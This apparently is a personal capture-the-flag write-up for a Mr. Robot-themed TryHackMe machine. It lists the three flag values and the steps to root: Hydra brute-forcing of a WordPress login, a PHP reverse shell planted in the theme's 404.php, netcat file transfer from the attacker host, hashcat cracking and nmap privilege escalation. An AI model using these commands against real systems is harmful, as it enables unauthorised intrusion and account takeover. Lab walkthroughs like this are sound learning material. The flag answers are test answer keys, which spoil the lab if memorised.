export IP=10.10.60.133


==================================================

[TASK 1] -Hack the machine

1) What is key 1?

	Answer: `073403c8a58a1f80d943455fb30724b9`
	Notes:
		- Gobuster showed an endpoint, /robots.
		- After going to /robots, found 'fsocity.dic' & 'key-1-of-3.txt'.
		- Appended those to the endpoint: 'http://$IP/fsocity.dic' & 'http://$IP/key-1-of-3.txt'
		- key-1-of-3.txt contained the first key.
		- Downloaded the contents of fsocity.dic into local file, flsocity.txt, using python.


2) What is key 2?

	Answer: `822c73956184f694993bede3eb39f959`
	Notes: 
		- While reverse shelled in the system as daemon, I ran the command, `python -c 'import pty; pty.spawn("/bin/bash")'` to spawn a bash shell, which would allow me to run the `su` command and log in as the user robot.
		- Ran command: `su -l robot` + cracked password from before, `abcdefghijklmnopqrstuvwxyz`
		- Gained access to robot user and was able to read the second flag.

3) What is key 3?

	Answer: `04787ddef27c3dee1ee161b21670b4e4`
	Notes:
		- Found an nmap vulnerability after scanning through the linpeas.sh output.
		- Search GTFOBins for nmap exploit and found this: https://gtfobins.github.io/gtfobins/nmap/
		- Used Shell > option b to gain access to root
		- Found the last flag at /root/key-3-of-3.txt


==================================================

Notes:
	- Starting with the classic nmap: `nmap -sC -sV -oN nmap/initial $IP`
		- Ports 80 and 443 (HTTP, SSL/HTTPS) are open.

	- Ran gobuster: `gobuster dir -u http://$IP -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt`
		- Found /robots, /admin, and some other endpoints.
		- A lot of things pointed to Wordpress so I'm going to search metasploit for a Wordpress exploit.'
		- /robots -> /fsocity.dic -> `Elliot` is a username for the wordpress login.

	- Messing with Burp Suite.
		- Details of the /wp-login.php login page:
			POST /wp-login.php

			log=admin&pwd=password&wp-submit=Log+In&redirect_to=http%3A%2F%2F10.10.47.107%2Fwp-admin%2F&testcookie=1

			ERROR: Invalid username.
			or
			ERROR: The password you entered for the username Elliot is incorrect.

		- Hydra command for the above details:
			`hydra -L ./fsocity.txt -p nothing $IP http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In&redirect_to=http%3A%2F%2F10.10.47.107%2Fwp-admin%2F&testcookie=1:ERROR: Invalid username."`

		- Details of the /wp-login.php?action=lostpassword forgot password page:
			POST /wp-login.php?action=lostpassword
			
			user_login=admin&redirect_to=&wp-submit=Get+New+Password

			ERROR: Invalid username or e-mail.

		- Hydra command for the above details:
			- `hydra -L ./fsocity.txt -p nothing $IP http-post-form "/wp-login.php?action=lostpassword:user_login=^USER^&redirect_to=&wp-submit=Get+New+Password:ERROR: Invalid username or e-mail."`

		- Didn't find Burp Suite + Hydra successful.

	- FOUND WORDPRESS USERNAME AND PASSWORD:
		- Username: Elliot
		- Password: ER28-0652

		- Ok, by going to http://$IP/fsocity.dic, I noticed a bit of a pattern with the text:
			true
			false
			wikia
			from
			the
			now
			Wikia         <-- notice the first capital letter
			extensions
			scss
			window
			http
			var
			page
			Robot         <-- next capital letter
			Elliot        <-- next captial letter
			styles
			and
			document
			mrrobot
			com
			ago
			function
			...
		- Put the captial words together: Wikia Robot Elliot
		- So I googled that and went to the Wikia Fandom page for Elliot Alderson (https://mrrobot.fandom.com/wiki/Elliot_Alderson)
		- I tried the username Elliot first because Wordpress login will verify if we have the correct username.
		- I then manually scraped through the Fandom page for different possible passwords. THe password, ER28-0652, is Elliot's employee number.

	- Once logged into the admin console using the Elliot username, I headed over the Appearances > Editor > 404.php, and copy and pasted the php-reverse-shell.php script into the 404.php page.
		- Open a netcat connection on my local machine: `nc -lvpn 9999`
		- Then go to: http://$IP/wp-content/themes/twentyfifteen/404.php
		- And VOILA! You have yourself a reverse shell.

	- Found a password.raw-md5 file at /home/robot/password.raw-md5
		- Copied it to my local machine and am going to run hashcat on it.
		- `hashcat -a 0 -m 0 -o cracked-password.raw-m5 c3fcd3d76192e4007dfb496cca67e13b /usr/share/wordlists/rockyou.txt`
		- Cracked password: abcdefghijklmnopqrstuvwxyz
		- `robot:abcdefghijklmnopqrstuvwxyz`

	- Used Netcat to move my /root/dev/linpeas.sh file over to the machine.
		- On my machine, I ran: `nc -q 0 -lvnp 1234 < linpeas.sh`
		- On the THM box, I ran: `nc <MY IP> 1234 > linpeas.sh`
		- Once downloaded, I changed the mode to executable: `chmod +x linpeas.sh`
		- Ran linpeas and found nmap vulnerability.
		- Side note: when I tried running linpeas.sh the first time, apparently is was already open somewhere else so I had to find the PID using this command, `fuser linpeas.sh`, then ran `kill <PID>` to stop it.